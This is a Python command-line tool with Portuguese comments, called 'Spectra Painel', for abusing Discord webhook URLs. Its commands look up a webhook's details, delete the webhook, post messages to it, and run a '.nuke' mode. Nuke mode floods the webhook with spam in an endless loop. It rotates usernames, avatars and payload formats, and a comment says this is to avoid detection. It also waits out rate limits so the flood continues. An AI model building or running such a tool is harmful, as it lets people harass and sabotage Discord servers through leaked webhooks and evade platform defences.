import requests
import sys
import os
import time
import random
import json
from datetime import datetime, timezone
from urllib.parse import urlparse
import threading

# =========================
# 🎨 Cores
# =========================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

# =========================
# 🧾 Banner
# =========================
def print_banner():
    banner = rf"""{Colors.RED}
____   ____   _____   _____   _____   ____    _____
/ ___| |  _ \ | ____| | ____| |_   _| |  _ \  |  _  |
\___ \ | |_) ||  _|   | |       | |   |_) | | |_| |
 ___) ||  __/ | |___  | |___    | |   |  _ <  |  _  |
|____/ |_|    |_____| |_____|   |_|   |_| \_\ |_| |_|

{Colors.RESET}
{Colors.BOLD}Made by _zxs.{Colors.RESET}
{Colors.YELLOW}This is free tool{Colors.RESET}
{Colors.MAGENTA}For commands use: .help{Colors.RESET}
"""
    print(banner)

# =========================
# 📘 Help
# =========================
def print_help():
    print(f"""
{Colors.CYAN}Commands:{Colors.RESET}
.wh <url>        → Info detalhada do webhook
.del <url>       → Deletar webhook (com confirmação)
.say <url> <msg> → Enviar mensagem (com embed)
.nuke <url> <msg>→ Spam infinito no webhook (CTRL+C para parar)
.nuke <url> <delay> <msg> → Spam com delay customizado
.clear           → Limpar tela
.exit            → Sair
""")

# =========================
# 🔍 Validação
# =========================
def validate_webhook_url(url):
    try:
        parsed = urlparse(url)

        if parsed.scheme not in ['http', 'https']:
            return False, "Protocolo inválido"

        if parsed.hostname not in ['discord.com', 'discordapp.com']:
            return False, "Domínio inválido"

        parts = parsed.path.strip('/').split('/')
        if len(parts) < 4 or parts[0] != 'api' or parts[1] != 'webhooks':
            return False, "Estrutura inválida"

        wh_id = parts[2]
        token = parts[3]

        if not wh_id.isdigit():
            return False, "ID inválido"

        base = f"{parsed.scheme}://{parsed.hostname}/api/webhooks/{wh_id}/{token}"
        return True, {"id": wh_id, "url": base, "token": token}

    except:
        return False, "URL mal formada"

# =========================
# ⏱ Converter ID → data
# =========================
def snowflake_to_date(snowflake):
    ts = ((int(snowflake) >> 22) + 1420070400000) / 1000
    return datetime.fromtimestamp(ts, tz=timezone.utc)

def format_age(date):
    delta = datetime.now(timezone.utc) - date
    days = delta.days
    hours = delta.seconds // 3600
    minutes = (delta.seconds % 3600) // 60
    
    if days > 0:
        return f"{days}d {hours}h"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

# =========================
# 🌐 Request helper
# =========================
def safe_request(method, url, **kwargs):
    for attempt in range(3):
        try:
            r = requests.request(method, url, timeout=10, **kwargs)

            if r.status_code == 429:
                wait = r.json().get("retry_after", 2)
                print(f"{Colors.YELLOW}Rate limit: {wait}s{Colors.RESET}")
                time.sleep(wait)
                continue

            return r
        except requests.exceptions.Timeout:
            print(f"{Colors.RED}Timeout... retry {attempt+1}/3{Colors.RESET}")
            time.sleep(1)
        except Exception as e:
            print(f"{Colors.RED}Erro: {e}{Colors.RESET}")
            return None
    return None

# =========================
# 🔎 Info webhook (MELHORADO)
# =========================
def cmd_wh(args):
    if not args:
        print(f"{Colors.RED}Uso: .wh <url>{Colors.RESET}")
        return

    ok, data = validate_webhook_url(args[0])
    if not ok:
        print(f"{Colors.RED}{data}{Colors.RESET}")
        return

    r = safe_request("GET", data["url"])
    if not r:
        return

    if r.status_code != 200:
        print(f"{Colors.RED}Erro: {r.status_code}{Colors.RESET}")
        if r.status_code == 404:
            print(f"{Colors.RED}Webhook não encontrado ou foi deletado{Colors.RESET}")
        return

    j = r.json()

    name = j.get("name", "Unknown")
    avatar = j.get("avatar", "None")
    channel_id = j.get("channel_id", "Unknown")
    guild_id = j.get("guild_id", "None")
    user = j.get("user", {})
    user_name = user.get("username", "Unknown")
    user_id = user.get("id", "Unknown")

    try:
        created_at = snowflake_to_date(data["id"])
        age_str = format_age(created_at)
        created_str = created_at.strftime("%Y-%m-%d %H:%M:%S UTC")
    except:
        age_str = "Unknown"
        created_str = "Unknown"

    # Tentar obter informações do servidor/canal
    channel_name = "Unknown"
    guild_name = "Unknown"
    
    if guild_id and guild_id != "None":
        guild_name = f"ID: {guild_id}"
    
    if channel_id and channel_id != "Unknown":
        channel_name = f"ID: {channel_id}"

    print(f"""
{Colors.CYAN}═══════════════════════════════════════════{Colors.RESET}
{Colors.BOLD}{Colors.WHITE}🔍 WEBHOOK INFO{Colors.RESET}
{Colors.CYAN}═══════════════════════════════════════════{Colors.RESET}

{Colors.GREEN}📛 Nome:{Colors.RESET} {name}
{Colors.GREEN}🆔 ID:{Colors.RESET} {data['id']}
{Colors.GREEN}📅 Criado:{Colors.RESET} {created_str} ({age_str} atrás)
{Colors.GREEN}👤 Criador:{Colors.RESET} {user_name} (ID: {user_id})
{Colors.GREEN}🖼️ Avatar:{Colors.RESET} {avatar if avatar else 'None'}

{Colors.GREEN}📢 Canal:{Colors.RESET} {channel_name}
{Colors.GREEN}🏛️ Servidor:{Colors.RESET} {guild_name}
{Colors.GREEN}🔗 URL:{Colors.RESET} {Colors.DIM}{data['url']}{Colors.RESET}
{Colors.CYAN}═══════════════════════════════════════════{Colors.RESET}
""")

# =========================
# ❌ Deletar webhook
# =========================
def cmd_del(args):
    if not args:
        print(f"{Colors.RED}Uso: .del <url>{Colors.RESET}")
        return

    ok, data = validate_webhook_url(args[0])
    if not ok:
        print(data)
        return

    confirm = input(f"{Colors.YELLOW}Tem certeza? (y/n): {Colors.RESET}")
    if confirm.lower() != 'y':
        print("Cancelado")
        return

    r = safe_request("DELETE", data["url"])
    if not r:
        return

    if r.status_code == 204:
        print(f"{Colors.GREEN}✅ Deletado com sucesso{Colors.RESET}")
    else:
        print(f"{Colors.RED}❌ Erro: {r.status_code}{Colors.RESET}")

# =========================
# 💬 Enviar mensagem
# =========================
def cmd_say(args):
    if len(args) < 2:
        print(f"{Colors.RED}Uso: .say <url> <msg>{Colors.RESET}")
        return

    ok, data = validate_webhook_url(args[0])
    if not ok:
        print(data)
        return

    msg = " ".join(args[1:])

    payload = {
        "username": "Mogged",
        "embeds": [
            {
                "title": "By Spectra Painel",
                "description": msg,
                "color": 5814783,
                "footer": {"text": f"Enviado em {datetime.now().strftime('%H:%M:%S')}"}
            }
        ]
    }

    r = safe_request("POST", data["url"], json=payload)
    if not r:
        return

    if r.status_code in [200, 204]:
        print(f"{Colors.GREEN}✅ Mensagem enviada{Colors.RESET}")
    else:
        print(f"{Colors.RED}❌ Erro: {r.status_code}{Colors.RESET}")

# =========================
# 💣 NUKE (SPAM INFINITO)
# =========================
nuke_running = False

def cmd_nuke(args):
    global nuke_running
    
    if len(args) < 2:
        print(f"{Colors.RED}Uso: .nuke <url> <msg> ou .nuke <url> <delay> <msg>{Colors.RESET}")
        return

    ok, data = validate_webhook_url(args[0])
    if not ok:
        print(data)
        return

    # Verifica se o segundo argumento é um delay (número)
    delay = 0.1
    msg_start = 1
    
    if len(args) >= 3 and args[1].replace('.', '').isdigit():
        try:
            delay = float(args[1])
            if delay < 0.01:
                delay = 0.01
            msg_start = 2
        except:
            pass
    
    msg = " ".join(args[msg_start:])
    
    if not msg:
        print(f"{Colors.RED}❌ Mensagem vazia{Colors.RESET}")
        return

    print(f"""
{Colors.RED}╔═══════════════════════════════════════════╗
║       💣 NUKE MODE ACTIVATED 💣             ║
╠═══════════════════════════════════════════╣
║ {Colors.YELLOW}Webhook:{Colors.RESET} {data['id']}
║ {Colors.YELLOW}Mensagem:{Colors.RESET} {msg[:50]}{'...' if len(msg)>50 else ''}
║ {Colors.YELLOW}Delay:{Colors.RESET} {delay}s
║ {Colors.YELLOW}Status:{Colors.RESET} {Colors.GREEN}SPAMMING{Colors.RESET}
╚═══════════════════════════════════════════╝
{Colors.RED}Pressione CTRL+C para parar{Colors.RESET}
""")

    nuke_running = True
    counter = 0
    errors = 0

    # Mensagens variadas para evitar detecção
    usernames = ["Spammer", "Nuker", "Bot", "Mogger", "Destroyer"]
    avatar_urls = [
        "https://cdn.discordapp.com/avatars/123/abc.png",
        "https://cdn.discordapp.com/embed/avatars/0.png",
        "https://cdn.discordapp.com/embed/avatars/1.png",
        "https://cdn.discordapp.com/embed/avatars/2.png"
    ]

    try:
        while nuke_running:
            # Alterna entre diferentes tipos de payload
            payload_type = random.randint(0, 2)
            
            if payload_type == 0:
                payload = {
                    "content": msg,
                    "username": f"{random.choice(usernames)}_{random.randint(100,999)}",
                    "avatar_url": random.choice(avatar_urls)
                }
            elif payload_type == 1:
                payload = {
                    "embeds": [{
                        "title": random.choice(["💀 NUKE", "🔥 SPAM", "⚡ DESTROY", "💣 BOMB"]),
                        "description": f"{msg}\n\n`Message #{counter+1}`",
                        "color": random.randint(0, 0xFFFFFF),
                        "footer": {"text": f"Sent by {random.choice(usernames)}"}
                    }]
                }
            else:
                payload = {
                    "content": f"{random.choice(['🚀', '💥', '🔥', '⚡', '💀'])} {msg} {random.choice(['🚀', '💥', '🔥', '⚡', '💀'])}",
                    "username": random.choice(usernames)
                }
            
            r = safe_request("POST", data["url"], json=payload)
            
            if r and r.status_code in [200, 204]:
                counter += 1
                if counter % 50 == 0:
                    print(f"{Colors.GREEN}[{counter}] Mensagens enviadas (último status: {r.status_code}){Colors.RESET}")
            else:
                errors += 1
                if errors > 10:
                    print(f"{Colors.RED}❌ Muitos erros consecutivos, parando...{Colors.RESET}")
                    break
                if errors % 5 == 0:
                    print(f"{Colors.YELLOW}⚠️ {errors} erros consecutivos{Colors.RESET}")

            time.sleep(delay)

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⏹️ Nuke interrompido pelo usuário{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}❌ Erro: {e}{Colors.RESET}")
    finally:
        nuke_running = False
        print(f"{Colors.CYAN}📊 Total de mensagens enviadas: {Colors.GREEN}{counter}{Colors.RESET}")
        if errors > 0:
            print(f"{Colors.YELLOW}⚠️ Erros: {errors}{Colors.RESET}")

# =========================
# 🧹 Clear
# =========================
def cmd_clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()

# =========================
# 🚀 Main
# =========================
def main():
    print_banner()

    while True:
        try:
            cmd = input(f"{Colors.MAGENTA}> {Colors.RESET}").strip()

            if not cmd:
                continue

            parts = cmd.split()
            c = parts[0].lower()
            args = parts[1:]

            if c == ".exit":
                print(f"{Colors.GREEN}Saindo...{Colors.RESET}")
                sys.exit()
            elif c == ".help":
                print_help()
            elif c == ".clear":
                cmd_clear()
            elif c == ".wh":
                cmd_wh(args)
            elif c == ".del":
                cmd_del(args)
            elif c == ".say":
                cmd_say(args)
            elif c == ".nuke":
                cmd_nuke(args)
            else:
                print(f"{Colors.RED}Comando inválido. Use .help{Colors.RESET}")

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Saindo...{Colors.RESET}")
            sys.exit()
        except Exception as e:
            print(f"{Colors.RED}Erro inesperado: {e}{Colors.RESET}")

# =========================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Programa finalizado{Colors.RESET}")
        sys.exit()
